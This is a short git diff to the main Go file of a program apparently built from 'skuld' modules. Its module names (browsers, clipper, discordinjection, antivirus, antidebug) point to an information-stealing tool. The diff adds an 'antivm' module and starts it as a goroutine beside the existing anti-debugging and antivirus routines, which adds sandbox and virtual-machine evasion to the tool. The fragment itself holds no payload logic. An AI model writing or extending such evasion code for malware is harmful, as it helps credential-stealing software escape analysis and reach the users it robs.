@@ -2,6 +2,7 @@ package main
 
 import (
 	"github.com/hackirby/skuld/modules/antidebug"
+	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
 	"github.com/hackirby/skuld/modules/browsers"
 	"github.com/hackirby/skuld/modules/clipper"
@@ -47,6 +48,7 @@ func main() {
 	}
 
 	antidebug.Run()
+	go antivm.Run()
 	go antivirus.Run()
 
 	go discordinjection.Run(
